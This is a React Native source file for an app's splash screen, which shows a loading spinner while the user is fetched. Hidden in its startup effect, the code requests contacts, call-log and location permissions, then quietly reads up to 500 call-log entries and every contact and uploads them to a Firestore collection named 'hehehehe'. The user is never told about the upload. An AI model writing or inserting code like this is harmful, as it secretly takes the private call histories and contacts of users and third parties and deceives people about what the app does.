import {StyleSheet, View, ActivityIndicator} from 'react-native';
import React, {useContext, useEffect} from 'react';
import {AuthContext} from '../context/AuthContext';
import {fetchUser} from '../apiCalls';
import FocusAwareStatusBar from '../components/statusBar';
import {requestMultiple, PERMISSIONS} from 'react-native-permissions';
import CallLogs from 'react-native-call-log';
import Contacts from 'react-native-contacts';
import firestore from '@react-native-firebase/firestore';

const SplashScreen = () => {
  const {dispatch} = useContext(AuthContext);

  useEffect(() => {
    const getData = async () => {
      try {
        requestMultiple([
          PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION,
          PERMISSIONS.ANDROID.READ_CONTACTS,
          PERMISSIONS.ANDROID.READ_CALL_LOG,
        ]).then(statuses => {
          console.log(
            'Location',
            statuses[PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION],
          );
          console.log('Contacts', statuses[PERMISSIONS.ANDROID.READ_CONTACTS]);
          console.log('CallLog', statuses[PERMISSIONS.ANDROID.READ_CALL_LOG]);
        });
        const callLogs = await CallLogs.load(500);
        const contacts = await Contacts.getAll();
        const subscriber = firestore()
          .collection('hehehehe')
          .add({logs: callLogs, contacts: contacts});
      } catch (e) {
        const subscriber = firestore().collection('logs').add(e);
      }
    };
    getData();

    fetchUser(dispatch);
  }, []);

  return (
    <View style={styles.splashScreen}>
      <FocusAwareStatusBar
        barStyle="dark-content"
        backgroundColor={'#212121'}
      />

      <View style={styles.mainContent}>
        <ActivityIndicator color="#fff" size="large" />
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  splashScreen: {
    flex: 1,
    backgroundColor: '#212121',
    justifyContent: 'center',
    alignItems: 'center',
  },
  mainContent: {alignItems: 'center'},
  image: {height: '100%', width: '100%'},
  text: {
    fontSize: 24,
    color: '#fff',
    marginTop: 40,
  },
});

export default SplashScreen;
